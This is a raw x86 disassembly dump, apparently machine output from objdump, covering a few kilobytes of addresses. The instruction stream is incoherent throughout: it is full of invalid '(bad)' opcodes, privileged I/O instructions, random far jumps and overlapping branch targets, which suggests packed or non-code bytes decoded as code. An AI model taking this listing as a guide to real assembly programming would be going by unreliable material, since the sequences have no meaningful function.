  41bd69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd6a:	mov    ah,0x99
  41bd6c:	sbb    al,0x25
  41bd6e:	xor    al,BYTE PTR [edi+0x1c]
  41bd71:	(bad)  
  41bd72:	(bad)  
  41bd75:	cmp    al,dl
  41bd77:	pop    ebp
  41bd79:	add    al,0x78
  41bd7b:	sbb    dx,dx
  41bd7e:	or     eax,0xe76dd122
  41bd83:	mov    dl,0x72
  41bd85:	push   edx
  41bd86:	xchg   esp,eax
  41bd87:	pop    esi
  41bd88:	or     DWORD PTR [edi-0x7517fee9],ecx
  41bd8e:	jle    0x41bd22
  41bd90:	sub    al,0x50
  41bd92:	jl     0x41bdd3
  41bd94:	lahf   
  41bd95:	stos   DWORD PTR es:[edi],eax
  41bd96:	mov    bl,0x60
  41bd98:	js     0x41bdbd
  41bd9a:	jecxz  0x41bd9f
  41bd9c:	adc    DWORD PTR [ebx],edx
  41bd9e:	inc    ebp
  41bd9f:	pop    ss
  41bda0:	pop    eax
  41bda1:	pop    esi
  41bda2:	scas   ax,WORD PTR es:[edi]
  41bda4:	test   eax,0xa6637eb1
  41bda9:	push   0xffffffef
  41bdab:	retf   0xa306
  41bdae:	push   ds
  41bdaf:	test   edx,esi
  41bdb1:	jecxz  0x41be26
  41bdb3:	imul   esp,DWORD PTR ds:0xf40a8b81,0xc0caf9aa
  41bdbd:	jmp    0xccb9:0x71a6c17f
  41bdc4:	repnz or ch,BYTE PTR [ebx+0x44]
  41bdc8:	mov    ebx,0x2508e44e
  41bdcd:	pop    ds
  41bdce:	add    esi,DWORD PTR [eax+0x73e9b5ba]
  41bdd4:	(bad)  
  41bdd5:	xchg   esi,eax
  41bdd6:	not    al
  41bdd8:	sahf   
  41bdd9:	dec    eax
  41bdda:	and    bh,BYTE PTR [esi+0x438a2a7b]
  41bde0:	xchg   ecx,eax
  41bde1:	call   0x285264e7
  41bde6:	cmp    eax,0x40885e59
  41bdeb:	dec    ebx
  41bdec:	(bad)  
  41bded:	(bad)  
  41bdee:	cmp    al,0x58
  41bdf0:	fisub  DWORD PTR [edx+0x4bb9c59a]
  41bdf6:	pop    ecx
  41bdf7:	xchg   edx,eax
  41bdf8:	push   esi
  41bdf9:	iret   
  41bdfa:	jp     0x41be19
  41bdfc:	popa   
  41bdfd:	test   al,0x11
  41bdff:	fstp   TBYTE PTR [edi+0x18]
  41be02:	add    eax,0x3d61bebf
  41be07:	push   ds
  41be08:	cmp    eax,0xe4aeee1f
  41be0d:	push   ebp
  41be0e:	ss fwait
  41be10:	xor    ecx,ebp
  41be12:	sahf   
  41be13:	add    ch,BYTE PTR [ecx-0x7da9b386]
  41be19:	adc    esp,edi
  41be1b:	xchg   ebx,eax
  41be1c:	pushf  
  41be1d:	les    edi,FWORD PTR [ecx-0x80]
  41be20:	xor    al,0x64
  41be22:	stc    
  41be23:	(bad)  
  41be24:	in     eax,0x75
  41be26:	push   eax
  41be27:	in     al,0x26
  41be29:	int3   
  41be2a:	bound  esi,QWORD PTR [eax]
  41be2c:	imul   ebp,DWORD PTR [eax-0x7f],0x1cea5667
  41be33:	sti    
  41be34:	mov    ch,0x11
  41be36:	rcr    eax,cl
  41be38:	loopne 0x41be7b
  41be3a:	jmp    0x4b42aad5
  41be3f:	retf   
  41be40:	in     eax,0xd4
  41be42:	inc    esp
  41be43:	xor    cl,al
  41be45:	xchg   ebp,eax
  41be46:	or     al,BYTE PTR [edx-0x23]
  41be49:	xor    al,0x51
  41be4b:	sbb    al,0x39
  41be4d:	out    dx,eax
  41be4e:	in     eax,dx
  41be4f:	(bad)  
  41be51:	in     eax,dx
  41be52:	stc    
  41be53:	inc    ebp
  41be54:	mov    ebx,0x8107e9f9
  41be59:	push   es
  41be5a:	std    
  41be5b:	push   eax
  41be5c:	fwait
  41be5d:	jb     0x41be8b
  41be5f:	xchg   edx,eax
  41be60:	iret   
  41be61:	inc    ebx
  41be62:	xlat   BYTE PTR ds:[ebx]
  41be63:	lods   al,BYTE PTR ds:[esi]
  41be64:	jge    0x41be92
  41be66:	inc    esp
  41be67:	xchg   ecx,eax
  41be68:	sbb    ebp,DWORD PTR [esi+ecx*2-0x34]
  41be6c:	push   ds
  41be6d:	mov    ds:0x4f962a2d,al
  41be72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be73:	inc    esi
  41be74:	jl     0x41bdfe
  41be76:	ret    
  41be77:	pop    esi
  41be78:	sbb    al,0x4a
  41be7a:	and    BYTE PTR [esp+edx*8],0xad
  41be7e:	pop    ebp
  41be7f:	sbb    eax,0xc8030a79
  41be84:	retf   
  41be85:	sub    BYTE PTR [esi+ebp*2-0x1691d9d5],bh
  41be8c:	xor    edx,DWORD PTR [edi+0x18]
  41be8f:	mov    bh,0x2e
  41be91:	fs xchg ebx,eax
  41be93:	(bad)  
  41be94:	mov    esp,DWORD PTR [edx]
  41be96:	in     al,0xc7
  41be98:	xor    dh,BYTE PTR [edi-0x2ea4b2e9]
  41be9e:	pop    ss
  41be9f:	js     0x41bf13
  41bea1:	mov    ch,0x42
  41bea3:	mov    al,ds:0xb5514425
  41bea8:	sbb    DWORD PTR [edi],esp
  41beaa:	mov    ebp,ecx
  41beac:	cmp    ecx,DWORD PTR [edx]
  41beae:	xor    al,0xe1
  41beb0:	push   ds
  41beb1:	sub    DWORD PTR [edi+0x63],eax
  41beb4:	(bad)  
  41beb5:	test   eax,0xdee7f91a
  41beba:	and    cl,BYTE PTR [esi]
  41bebc:	jno    0x41be76
  41bebe:	cmp    al,0xb8
  41bec0:	out    dx,eax
  41bec1:	leave  
  41bec2:	push   esi
  41bec3:	jo     0x41bf1a
  41bec5:	enter  0xa2a8,0xca
  41bec9:	xor    ebp,DWORD PTR [edx]
  41becb:	or     esi,ecx
  41becd:	mov    eax,ds:0x93fe51e3
  41bed2:	push   es
  41bed3:	add    al,BYTE PTR [ecx-0x4]
  41bed6:	and    ecx,edx
  41bed8:	call   0x7410:0x55ed8f26
  41bedf:	and    dl,BYTE PTR [eax-0x56]
  41bee2:	push   edx
  41bee3:	mov    ebx,0xc3853126
  41bee8:	fsub   DWORD PTR [esi+0x14e991b8]
  41beee:	popa   
  41beef:	pop    ecx
  41bef0:	clc    
  41bef1:	rcl    BYTE PTR ds:0xbf651c31,0x8f
  41bef8:	retf   
  41bef9:	or     dh,BYTE PTR [edi+0x2a]
  41befc:	xor    ah,dh
  41befe:	sbb    al,0xfc
  41bf00:	xchg   esi,eax
  41bf01:	aaa    
  41bf02:	aas    
  41bf03:	pop    esp
  41bf04:	push   esi
  41bf05:	jmp    0x3e1f4914
  41bf0a:	int3   
  41bf0b:	sbb    bl,0x6a
  41bf0e:	shr    esi,0x7b
  41bf11:	sbb    eax,DWORD PTR [edi+0x43967b3d]
  41bf17:	nop
  41bf18:	dec    esp
  41bf19:	xchg   esi,eax
  41bf1a:	in     eax,0xd7
  41bf1c:	in     al,dx
  41bf1d:	aad    0x99
  41bf1f:	test   eax,0x4ad284df
  41bf24:	adc    al,0x44
  41bf26:	jl     0x41bee0
  41bf28:	(bad)  
  41bf29:	clc    
  41bf2a:	ins    DWORD PTR es:[edi],dx
  41bf2b:	jl     0x41bf37
  41bf2d:	ja     0x41bf50
  41bf2f:	imul   ecx,DWORD PTR [eax],0x83c3e589
  41bf35:	mov    dl,BYTE PTR [edi+0x355ecc63]
  41bf3b:	pop    esp
  41bf3c:	(bad)  
  41bf3d:	jl     0x41bf6b
  41bf3f:	fimul  DWORD PTR [edi]
  41bf41:	(bad)
  41bf44:	not    DWORD PTR [edx+esi*8+0x357579f1]
  41bf4b:	cmc    
  41bf4c:	add    BYTE PTR [ebp-0x77],ah
  41bf4f:	arpl   WORD PTR [eax],sp
  41bf51:	out    0x3e,eax
  41bf53:	mov    eax,0x4252254b
  41bf58:	jmp    0x5398:0xb40d2b89
  41bf5f:	call   0x6b53:0xa93b2d0d
  41bf66:	call   0xde4264ae
  41bf6b:	in     al,0xf8
  41bf6d:	xchg   BYTE PTR [edi],bh
  41bf6f:	cmp    eax,eax
  41bf71:	pop    edx
  41bf72:	outs   dx,BYTE PTR ds:[esi]
  41bf73:	xchg   ecx,eax
  41bf74:	jb     0x41bfa4
  41bf76:	stos   BYTE PTR es:[edi],al
  41bf77:	jbe    0x41bf8b
  41bf79:	fs popaw 
  41bf7c:	shl    DWORD PTR [edx],0x19
  41bf7f:	jg     0x41bf1c
  41bf81:	sbb    al,dl
  41bf83:	outs   dx,BYTE PTR ds:[esi]
  41bf84:	dec    ecx
  41bf85:	ins    DWORD PTR es:[edi],dx
  41bf86:	test   BYTE PTR [eax+eax*8],0x8e
  41bf8a:	push   0xffffffc5
  41bf8c:	mov    eax,ds:0x2cc50941
  41bf91:	xchg   ebx,eax
  41bf92:	xor    DWORD PTR [ebx-0x7a65a5ce],esi
  41bf98:	mul    BYTE PTR [ebp+0x7951878]
  41bf9e:	mov    esp,0x6101f494
  41bfa3:	xchg   ecx,ebx
  41bfa5:	mov    ds:0xdcefed9,al
  41bfaa:	cli    
  41bfab:	cld    
  41bfac:	mov    ebp,esp
  41bfae:	cmp    al,0x38
  41bfb0:	and    BYTE PTR [edi],ah
  41bfb2:	inc    eax
  41bfb3:	es jecxz 0x41bfd1
  41bfb6:	and    dh,ch
  41bfb8:	dec    edi
  41bfb9:	jo     0x41c016
  41bfbb:	out    0x78,eax
  41bfbd:	xchg   esp,eax
  41bfbe:	push   edx
  41bfbf:	in     al,0x18
  41bfc1:	cdq    
  41bfc2:	cli    
  41bfc3:	(bad)  
  41bfc4:	fisttp WORD PTR [ebx-0x65]
  41bfc7:	shr    DWORD PTR [edi+0x1],1
  41bfca:	sar    DWORD PTR [ebx-0x3eebbd47],1
  41bfd0:	popa   
  41bfd1:	stos   DWORD PTR es:[edi],eax
  41bfd2:	fwait
  41bfd3:	push   edi
  41bfd4:	out    dx,al
  41bfd5:	push   ss
  41bfd6:	push   ss
  41bfd7:	ret    
  41bfd8:	shr    DWORD PTR [ecx+0x4a],1
  41bfdb:	mov    bl,0x32
  41bfdd:	adc    edi,DWORD PTR [esi]
  41bfdf:	pop    ds
  41bfe0:	(bad)  [eax-0x1f]
  41bfe3:	nop
  41bfe4:	pop    edx
  41bfe5:	data16 int3 
  41bfe7:	into   
  41bfe8:	or     edi,DWORD PTR [edi+edi*8+0x7c]
  41bfec:	fbstp  TBYTE PTR [eax-0x682fc515]
  41bff2:	xor    dl,dh
  41bff4:	pop    ss
  41bff5:	fstp   st(7)
  41bff7:	adc    cl,BYTE PTR [eax+0x49a16f59]
  41bffd:	das    
  41bffe:	lods   al,BYTE PTR ds:[esi]
  41bfff:	inc    edi
  41c000:	cli    
  41c001:	push   ss
  41c002:	add    bh,bl
  41c004:	inc    eax
  41c005:	pop    ecx
  41c006:	pop    ss
  41c007:	das    
  41c008:	cmc    
  41c009:	(bad)  
  41c00a:	adc    al,0xdf
  41c00c:	cwde   
  41c00d:	lds    ebp,FWORD PTR [edi]
  41c00f:	and    esp,DWORD PTR [edx-0x20b3b6f7]
  41c015:	and    eax,0x4d823132
  41c01a:	xchg   esp,eax
  41c01b:	inc    edi
  41c01c:	enter  0x8ae1,0x4d
  41c020:	das    
  41c021:	push   esp
  41c022:	dec    esi
  41c023:	(bad)  
  41c024:	fisttp QWORD PTR [edx]
  41c026:	repz add BYTE PTR [ebx+0x7f9bae94],dl
  41c02d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c02e:	jbe    0x41c033
  41c030:	shl    BYTE PTR [edi-0x3f],1
  41c033:	mov    bh,0x88
  41c035:	stc    
  41c036:	mov    al,ds:0x8f4080ff
  41c03b:	and    dh,0xd4
  41c03e:	pop    esi
  41c03f:	jae    0x41c0ae
  41c041:	js     0x41c0ac
  41c043:	adc    DWORD PTR [ebx+ebp*4-0x2cea189b],esp
  41c04a:	dec    edx
  41c04b:	sahf   
  41c04c:	mov    ds:0xd5c6dbbe,al
  41c051:	cmp    dh,ch
  41c053:	ins    BYTE PTR es:[edi],dx
  41c054:	dec    edx
  41c055:	das    
  41c056:	mov    al,ds:0x24f21a49
  41c05b:	dec    esp
  41c05c:	fisub  DWORD PTR [edi-0x560d5c80]
  41c062:	fst    QWORD PTR [ebx-0x44a6aa18]
  41c068:	add    al,BYTE PTR [eax+0xc]
  41c06b:	mov    BYTE PTR ds:[ebx-0x5a],bl
  41c06f:	and    eax,0x69f717ae
  41c074:	repnz mov bl,0x11
  41c077:	mov    cl,0x49
  41c079:	loopne 0x41c039
  41c07b:	xchg   edx,esi
  41c07d:	push   esp
  41c07e:	aaa    
  41c07f:	jae    0x41c0c0
  41c081:	cmp    al,0xb8
  41c083:	inc    ebp
  41c084:	and    ah,ah
  41c086:	inc    ebx
  41c087:	jge    0x41c0ef
  41c089:	pop    esi
  41c08a:	ret    0xeb01
  41c08d:	mov    ecx,0x1f24b7f5
  41c092:	jle    0x41c065
  41c094:	rol    DWORD PTR [ecx-0x19],1
  41c097:	push   edi
  41c098:	inc    edx
  41c099:	cmp    BYTE PTR fs:[ebx],cl
  41c09c:	inc    esi
  41c09d:	lahf   
  41c09e:	(bad)  
  41c09f:	loopne 0x41c0dd
  41c0a1:	jb     0x41c100
  41c0a3:	shl    BYTE PTR [edi],1
  41c0a5:	mov    WORD PTR [edi],?
  41c0a7:	fild   QWORD PTR [edx]
  41c0a9:	cmp    dl,al
  41c0ab:	stos   DWORD PTR es:[edi],eax
  41c0ac:	hlt    
  41c0ad:	cdq    
  41c0ae:	gs pushf 
  41c0b0:	loop   0x41c126
  41c0b2:	pusha  
  41c0b3:	jbe    0x41c12f
  41c0b5:	mov    ah,0xd9
  41c0b7:	cwde   
  41c0b8:	stos   DWORD PTR es:[edi],eax
  41c0b9:	pop    esi
  41c0ba:	mov    dl,0xd9
  41c0bc:	add    cl,0x2e
  41c0bf:	jmp    0xeac2:0xc14056f6
  41c0c6:	fcom   st(3)
  41c0c8:	and    al,0x33
  41c0ca:	iret   
  41c0cb:	data16 mov cl,0x1e
  41c0ce:	sub    DWORD PTR [esi],0x27
  41c0d1:	sub    ecx,DWORD PTR [ecx+0x49]
  41c0d4:	clc    
  41c0d5:	or     bh,al
  41c0d7:	cdq    
  41c0d8:	imul   edx,DWORD PTR [ebp+ebp*4-0x52cbc13d],0x1e895ef
  41c0e3:	xchg   ebp,eax
  41c0e4:	sub    al,0xc
  41c0e6:	pop    ecx
  41c0e7:	xor    esi,DWORD PTR [ebp-0x639ed73d]
  41c0ed:	icebp  
  41c0ee:	xchg   esp,eax
  41c0ef:	mov    dl,0x74
  41c0f1:	leave  
  41c0f2:	xlat   BYTE PTR ds:[ebx]
  41c0f3:	cmp    al,0xf2
  41c0f5:	call   0xf279b354
  41c0fa:	dec    ecx
  41c0fb:	pop    esi
  41c0fc:	iret   
  41c0fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0fe:	fs sahf 
  41c100:	and    al,0x69
  41c102:	fmul   st,st(7)
  41c104:	ror    BYTE PTR [eax],0xa1
  41c107:	push   edi
  41c108:	shl    DWORD PTR [edi+0x66],cl
  41c10b:	repz push edx
  41c10d:	inc    ebx
  41c10e:	xchg   esp,eax
  41c10f:	mov    eax,ds:0x9cf1907f
  41c114:	mov    al,ss:0x47bfc657
  41c11a:	push   cs
  41c11b:	in     eax,0xfc
  41c11d:	ins    BYTE PTR es:[edi],dx
  41c11e:	jne    0x41c155
  41c120:	neg    DWORD PTR [eax-0x5f]
  41c123:	add    BYTE PTR [edi+0x1],dl
  41c126:	ror    BYTE PTR ds:0x50783a40,1
  41c12c:	mov    ecx,0x690d16bf
  41c131:	push   ebx
  41c132:	push   ss
  41c133:	ret    
  41c134:	mov    ebp,DWORD PTR [esi]
  41c136:	xor    eax,0x8e220d20
  41c13b:	push   esi
  41c13c:	leave  
  41c13d:	add    DWORD PTR [ecx+0x60007c2c],ebp
  41c143:	or     edx,0xbf488411
  41c149:	sti    
  41c14a:	test   al,0x29
  41c14c:	sub    al,0xab
  41c14e:	or     eax,ecx
  41c150:	lahf   
  41c151:	imul   ebx,DWORD PTR [esi+edx*8+0x35],0x3f
  41c156:	xor    dl,BYTE PTR [ecx+edx*8+0x0]
  41c15a:	out    dx,al
  41c15b:	mov    ch,BYTE PTR [ecx-0x40483679]
  41c161:	push   es
  41c162:	sar    cl,cl
  41c164:	pop    esp
  41c165:	fsubr  st(1),st
  41c167:	rcl    BYTE PTR [edi+0x75],1
  41c16a:	jo     0x41c1c0
  41c16c:	aas    
  41c16d:	adc    BYTE PTR [edx-0x5b],dh
  41c170:	icebp  
  41c171:	xchg   esp,eax
  41c172:	fsubr  DWORD PTR [edi+0xe5f7f68]
  41c178:	or     ecx,DWORD PTR [ecx+0x7edfd74a]
  41c17e:	je     0x41c1a6
  41c180:	or     ah,cl
  41c182:	sub    ch,cl
  41c184:	cdq    
  41c185:	or     BYTE PTR [ebx],ch
  41c187:	xchg   ecx,eax
  41c188:	dec    edx
  41c189:	cmp    eax,0xf32edb9e
  41c18e:	push   eax
  41c18f:	sub    eax,0xb050aec2
  41c194:	pop    es
  41c195:	sub    eax,0xa20c7ba
  41c19a:	push   0x80bac0e2
  41c19f:	lods   eax,DWORD PTR ds:[esi]
  41c1a0:	adc    ch,BYTE PTR [eax+0x41]
  41c1a3:	scas   eax,DWORD PTR es:[edi]
  41c1a4:	test   al,0x0
  41c1a6:	xchg   al,ah
  41c1a8:	xor    cl,BYTE PTR [edi+0x30172a2d]
  41c1ae:	dec    esp
  41c1af:	xor    ecx,esi
  41c1b1:	mov    eax,ds:0xbb4d37d1
  41c1b6:	pop    esp
  41c1b7:	jmp    0x41c22c
  41c1b9:	xchg   ebx,eax
  41c1ba:	fmul   DWORD PTR [ebx]
  41c1bc:	div    al
  41c1be:	xchg   ebx,eax
  41c1bf:	aam    0x4e
  41c1c1:	push   0x57
  41c1c3:	int3   
  41c1c4:	mov    ecx,0xbb439f8
  41c1c9:	push   ss
  41c1ca:	sbb    BYTE PTR [ebx],ah
  41c1cc:	xor    BYTE PTR [ebx+ecx*8+0x39b05ba7],ah
  41c1d3:	push   0xffffffe8
  41c1d5:	push   cs
  41c1d6:	xor    eax,0x7e7fbabb
  41c1db:	loopne 0x41c176
  41c1dd:	retf   0x22cf
  41c1e0:	sbb    DWORD PTR [eax+esi*1+0x589a394b],0xffffffe9
  41c1e8:	xchg   ebx,eax
  41c1e9:	imul   ecx,DWORD PTR [edx-0x3c1b6321],0x1
  41c1f0:	and    DWORD PTR [ecx-0xa199b2a],esi
  41c1f6:	xchg   DWORD PTR ds:0x2f6873a3,edi
  41c1fc:	sub    al,0xa7
  41c1fe:	lea    ebx,[ebx+ebp*1-0x3d]
  41c202:	in     al,dx
  41c203:	xchg   BYTE PTR [edi],bh
  41c205:	adc    ecx,DWORD PTR [esi]
  41c207:	loopne 0x41c232
  41c209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c20a:	push   DWORD PTR [ebx+0x348d70a2]
  41c210:	cmc    
  41c211:	ror    dh,0x3a
  41c214:	fld    TBYTE PTR [ecx+0x14]
  41c217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c218:	xor    BYTE PTR [edx+0x4a],cl
  41c21b:	test   BYTE PTR [ebp-0x151cab55],dl
  41c221:	push   edx
  41c222:	add    al,0xd6
  41c224:	mov    DWORD PTR [ebx+0x208b9631],0xb208e699
  41c22e:	jb     0x41c29f
  41c230:	adc    edx,edx
  41c232:	add    ch,bh
  41c234:	xchg   ecx,eax
  41c235:	sbb    eax,0x89cc4c89
  41c23a:	std    
  41c23b:	sub    eax,0x6d252e5a
  41c240:	repz sbb DWORD PTR gs:[edi+0x56f01074],edx
  41c248:	mov    WORD PTR [ebx+0x4b935075],?
  41c24e:	pop    ebx
  41c24f:	push   eax
  41c250:	sub    esp,DWORD PTR [eax]
  41c252:	adc    al,0x6b
  41c254:	add    DWORD PTR [ecx-0x78],eax
  41c257:	test   esp,esp
  41c259:	call   DWORD PTR [ebp-0x5]
  41c25c:	nop
  41c25d:	shl    dh,cl
  41c25f:	jb     0x41c200
  41c261:	(bad)  
  41c262:	es jmp 0x6f4:0x8e5e8650
  41c26a:	icebp  
  41c26b:	dec    eax
  41c26c:	stc    
  41c26d:	data16 fst QWORD PTR [edx+ebx*4]
  41c271:	or     esp,esi
  41c273:	push   edx
  41c274:	mov    bl,0x21
  41c276:	in     eax,0x6a
  41c278:	(bad)
  41c27b:	add    al,0x4d
  41c27d:	dec    edx
  41c27e:	xchg   ecx,eax
  41c27f:	xor    DWORD PTR [edx+0x3ae689b7],ecx
  41c285:	or     DWORD PTR [esi+edi*1+0x1b76d000],ecx
  41c28c:	mov    fs,eax
  41c28e:	push   esp
  41c28f:	jbe    0x41c273
  41c291:	or     al,0x7d
  41c293:	pop    edi
  41c294:	hlt    
  41c295:	ret    0xa865
  41c298:	adc    eax,0x82d8b90f
  41c29d:	dec    esi
  41c29e:	or     ah,BYTE PTR [edi+0x656ae863]
  41c2a4:	pushf  
  41c2a5:	les    eax,FWORD PTR [esi]
  41c2a7:	bound  ebx,QWORD PTR [edx+0x293f7c97]
  41c2ad:	stc    
  41c2ae:	add    al,0x62
  41c2b0:	clc    
  41c2b1:	popa   
  41c2b2:	dec    eax
  41c2b3:	inc    ebx
  41c2b4:	adc    edi,DWORD PTR [ebp-0x2ab74263]
  41c2ba:	or     DWORD PTR [ebx],0xffffffd5
  41c2bd:	dec    esp
  41c2be:	sbb    al,BYTE PTR [edx-0x2327ec7]
  41c2c4:	or     esp,ecx
  41c2c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2c7:	dec    ebp
  41c2c8:	adc    esp,esp
  41c2ca:	loope  0x41c268
  41c2cc:	dec    ebx
  41c2cd:	jg     0x41c345
  41c2cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2d0:	adc    al,0xea
  41c2d2:	pop    edi
  41c2d3:	pop    ebx
  41c2d4:	outs   dx,BYTE PTR gs:[esi]
  41c2d6:	lods   al,BYTE PTR ds:[esi]
  41c2d7:	adc    dl,cl
  41c2d9:	xchg   ecx,eax
  41c2da:	adc    BYTE PTR [ebp-0x49],cl
  41c2dd:	dec    edx
  41c2de:	(bad)  
  41c2df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2e0:	dec    esp
  41c2e1:	cmp    ebp,edx
  41c2e3:	sar    BYTE PTR [edi-0x63],0x23
  41c2e7:	icebp  
  41c2e8:	mov    ah,0x88
  41c2ea:	push   0xffffff87
  41c2ec:	sub    ah,BYTE PTR [ecx]
  41c2ee:	pop    ds
  41c2ef:	xor    bl,BYTE PTR [esi+0x56eb8ce5]
  41c2f5:	retf   0xe393
  41c2f8:	ror    DWORD PTR [ebp-0x45],0xf9
  41c2fc:	jg     0x41c2c8
  41c2fe:	inc    ebx
  41c2ff:	rcr    BYTE PTR [eax-0x27],cl
  41c302:	dec    edx
  41c303:	fbstp  TBYTE PTR [ecx-0x2df840d1]
  41c309:	inc    esp
  41c30a:	loop   0x41c335
  41c30c:	ficom  WORD PTR [esi-0x645409e6]
  41c312:	lods   al,BYTE PTR ds:[esi]
  41c313:	popa   
  41c314:	ror    bh,0x96
  41c317:	push   edi
  41c318:	jl     0x41c2cc
  41c31a:	push   edx
  41c31b:	in     eax,0x5e
  41c31d:	ret    
  41c31e:	dec    esp
  41c31f:	repz shl DWORD PTR [edi+0x38fa0f77],0xc1
  41c327:	shl    DWORD PTR [ecx],1
  41c329:	jge    0x41c2f0
  41c32b:	add    ebp,DWORD PTR [ebp+0x6a]
  41c32e:	sbb    al,0xe
  41c330:	sar    DWORD PTR [esi],0x81
  41c333:	fild   QWORD PTR [edx-0x1737d22f]
  41c339:	mov    edx,DWORD PTR ds:0x7da0dd2
  41c33f:	xchg   ebx,eax
  41c340:	jge    0x41c31d
  41c342:	int    0xf1
  41c344:	frstor [edi]
  41c346:	or     BYTE PTR [esi-0x6a37add9],0x83
  41c34d:	mov    ch,0xc6
  41c34f:	std    
  41c350:	(bad)  
  41c351:	std    
  41c352:	aaa    
  41c353:	(bad)  [ebp+0x1c]
  41c356:	sub    DWORD PTR [ebp-0x80d026a],esi
  41c35c:	inc    edx
  41c35d:	inc    esi
  41c35e:	sbb    DWORD PTR [edx-0x6502e8e9],esp
  41c364:	out    0x89,al
  41c366:	mov    ds:0xfa344ac,eax
  41c36b:	test   al,0x24
  41c36d:	neg    BYTE PTR [ecx+ebx*2-0x4bd1f448]
  41c374:	data16 jae 0x41c32b
  41c377:	jecxz  0x41c34e
  41c379:	sub    BYTE PTR [eax+eax*1+0x53a24c0a],al
  41c380:	mov    esp,0xa25a37b6
  41c385:	lahf   
  41c386:	push   0x3885b679
  41c38b:	faddp  st(3),st
  41c38d:	sub    esp,DWORD PTR [ecx]
  41c38f:	xor    dl,BYTE PTR [ebp+0x53950b53]
  41c395:	out    dx,eax
  41c396:	fldcw  WORD PTR [edi-0x4e4aee22]
  41c39c:	xchg   edx,eax
  41c39d:	pop    ebx
  41c39e:	xchg   ebp,eax
  41c39f:	xor    ecx,esp
  41c3a1:	cdq    
  41c3a2:	loope  0x41c3c4
  41c3a4:	repz adc bh,BYTE PTR [ebx+ebp*1+0x42b658d8]
  41c3ac:	cmp    eax,0xd18dc444
  41c3b1:	push   esp
  41c3b2:	shl    DWORD PTR [ebx-0x28],cl
  41c3b5:	adc    edi,edi
  41c3b7:	xchg   edi,eax
  41c3b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3b9:	xchg   DWORD PTR [ebx-0x345980b0],ecx
  41c3bf:	into   
  41c3c0:	or     DWORD PTR [esi-0x72],ebx
  41c3c3:	sbb    BYTE PTR [edi],dh
  41c3c5:	repnz int3 
  41c3c7:	hlt    
  41c3c8:	(bad)  
  41c3c9:	push   esp
  41c3ca:	mov    esp,0x3235c43b
  41c3cf:	out    0x86,eax
  41c3d1:	fwait
  41c3d2:	retf   0xad52
  41c3d5:	jns    0x41c438
  41c3d7:	js     0x41c362
  41c3d9:	mov    bh,0xc2
  41c3db:	add    al,BYTE PTR [edi+edx*2-0x78]
  41c3df:	loopne 0x41c42c
  41c3e1:	jb     0x41c44c
  41c3e3:	lds    esp,FWORD PTR [edx-0xa]
  41c3e6:	dec    ebx
  41c3e7:	xor    eax,0x3c67ce66
  41c3ec:	pop    ebx
  41c3ed:	cmp    al,0x90
  41c3ef:	sbb    BYTE PTR [ecx+0x43022134],0x81
  41c3f6:	jmp    FWORD PTR [ebx+ecx*8]
  41c3f9:	mov    ecx,0xe2398ef6
  41c3fe:	fistp  WORD PTR [edi-0x7c]
  41c401:	mov    ebp,0xfc78ba9d
  41c406:	lds    edx,FWORD PTR [ecx]
  41c408:	adc    eax,0x7967d9f0
  41c40d:	ds inc esi
  41c40f:	pop    esi
  41c410:	or     al,BYTE PTR [ebx-0x18fbff0b]
  41c416:	dec    edi
  41c417:	(bad)  
  41c418:	cdq    
  41c419:	rol    BYTE PTR [edi+ebp*8],0xee
  41c41d:	sub    al,0x90
  41c41f:	adc    DWORD PTR [ecx-0x4aeae309],esp
  41c425:	and    DWORD PTR [eax+0x748ba416],ebx
  41c42b:	sbb    ebp,ebp
  41c42d:	sub    eax,0x7e73196d
  41c432:	mov    eax,0x8c5abc71
  41c437:	outs   dx,BYTE PTR ds:[esi]
  41c438:	dec    edi
  41c439:	adc    ebx,DWORD PTR [ebx]
  41c43b:	mov    ds:0x213c09c,eax
  41c440:	cmp    al,0xed
  41c442:	inc    eax
  41c443:	imul   edx,DWORD PTR [edx+0x103a3d54],0x51f5fe27
  41c44d:	aad    0x7b
  41c44f:	xor    edi,DWORD PTR [ebp-0x13]
  41c452:	sub    eax,0x404ce7a6
  41c457:	test   al,0xb0
  41c459:	pop    eax
  41c45a:	test   BYTE PTR [edx],ch
  41c45c:	bound  eax,QWORD PTR [ebp-0x3f]
  41c45f:	aam    0x71
  41c461:	popf   
  41c462:	popa   
  41c463:	sbb    bh,BYTE PTR [edx+0x75]
  41c466:	(bad)  
  41c467:	dec    edi
  41c468:	jnp    0x41c4e8
  41c46a:	dec    esi
  41c46b:	out    0xe,eax
  41c46d:	xor    cl,bl
  41c46f:	inc    ebp
  41c470:	ds dec edi
  41c472:	inc    edx
  41c473:	(bad)  
  41c474:	mov    dh,0x91
  41c476:	shl    BYTE PTR [edi+0x14e906aa],1
  41c47c:	and    esp,ecx
  41c47e:	call   0x186b:0xc5fe3f90
  41c485:	ret    0x61a7
  41c488:	pusha  
  41c489:	out    dx,al
  41c48a:	mov    ds:0xb1b950a8,eax
  41c48f:	cmovp  edx,DWORD PTR [esi+0xb]
  41c493:	cld    
  41c494:	push   edx
  41c495:	add    ah,BYTE PTR [ebp-0xb5315f9]
  41c49b:	ficomp WORD PTR [ecx+0x66]
  41c49e:	out    0xde,al
  41c4a0:	daa    
  41c4a1:	aaa    
  41c4a2:	mov    ebx,0x9a494534
  41c4a7:	(bad)
  41c4ab:	sbb    ax,0xda99
  41c4af:	daa    
  41c4b0:	dec    ecx
  41c4b1:	sub    eax,0x454e97a9
  41c4b6:	loop   0x41c456
  41c4b8:	jmp    0xda49:0xc5dd4b9e
  41c4bf:	or     ah,BYTE PTR [ebx-0x22]
  41c4c2:	pop    eax
  41c4c3:	stc    
  41c4c4:	adc    BYTE PTR [ebx+eax*8],cl
  41c4c7:	push   ss
  41c4c8:	enter  0xbd8d,0x39
  41c4cc:	outs   dx,BYTE PTR ds:[esi]
  41c4cd:	imul   eax,DWORD PTR [edx+0x3d9480cf],0x6b
  41c4d4:	stos   DWORD PTR es:[edi],eax
